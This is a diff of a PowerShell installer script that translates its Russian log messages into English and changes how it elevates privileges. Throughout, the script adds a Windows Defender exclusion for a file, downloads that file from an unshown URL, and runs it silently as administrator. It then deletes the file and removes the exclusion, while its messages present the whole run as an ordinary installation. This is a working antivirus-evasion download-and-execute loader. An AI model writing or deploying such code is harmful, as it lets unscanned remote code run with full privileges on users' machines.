@@ -13,12 +13,10 @@ function Add-DefenderExclusion {
     param (
         [string]$path
     )
-    Write-Log "Добавляем файл $path в список исключений Windows Defender..."
     try {
-        Add-MpPreference -ExclusionPath $path
-        Write-Log "Файл $path успешно добавлен в список исключений."
+        Start-Process -FilePath "powershell" -ArgumentList "-Command `"Add-MpPreference -ExclusionPath '$path'`"" -Verb RunAs -Wait
     } catch {
-        Write-Host "[ERROR] Не удалось добавить файл в список исключений Windows Defender: $_"
+        Write-Host "[ERROR] File ExclusionPath Add (MS Defender) failed: $_"
         exit 1
     }
 }
@@ -27,12 +25,10 @@ function Remove-DefenderExclusion {
     param (
         [string]$path
     )
-    Write-Log "Удаляем файл $path из списка исключений Windows Defender..."
     try {
-        Remove-MpPreference -ExclusionPath $path
-        Write-Log "Файл $path успешно удален из списка исключений."
+        Start-Process -FilePath "powershell" -ArgumentList "-Command `"Remove-MpPreference -ExclusionPath '$path'`"" -Verb RunAs -Wait
     } catch {
-        Write-Host "[ERROR] Не удалось удалить файл из списка исключений Windows Defender: $_"
+        Write-Host "[ERROR] File ExclusionPath Removing (MS Defender) failed: $_"
     }
 }
 
@@ -44,40 +40,38 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    Write-Log "Скрипт должен быть запущен с правами администратора."
-    Start-Process powershell -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"" + $PSCommandPath + "`"") -Verb RunAs
-    exit
+    Write-Host "[ERROR] You need to run PowerShell as Administrator!"
+    Write-Host " -> Press any key to exit."
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit 1
 }
 
 try {
     Add-DefenderExclusion -path $filename
 
-    Write-Log "Скачиваем файл..."
+    Write-Log "Downloading..."
     Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop
 
     if (Test-Path $filename) {
-        Write-Log "Файл успешно скачан."
+        Write-Log "Files downloaded. They will be deleted after installation."
     } else {
-        throw "Ошибка при скачивании файла."
+        throw "[ERROR] File downloading error."
     }
 
     $command = "& {Start-Process -FilePath $filename -ArgumentList '/VERYSILENT' -Verb RunAs}"
 
-    Write-Log "Запускаем файл с параметрами /VERYSILENT от имени администратора..."
+    Write-Log "Completing installation..."
     Invoke-Expression $command
 
-    Write-Log "Установка завершена."
-
-    Write-Log "Удаляем файл..."
     Remove-Item $filename -ErrorAction Stop
 
     Remove-DefenderExclusion -path $filename
 
-    Write-Log "Скрипт завершен. Нажмите любую клавишу для выхода."
+    Write-Log "Installation completed. Press any key to exit."
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 } catch {
-    Write-Host "[ERROR] Произошла ошибка: $_"
-    Write-Host "Нажмите любую клавишу для выхода."
+    Write-Host "[ERROR] Error code: $_"
+    Write-Host " -> Press any key to exit."
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
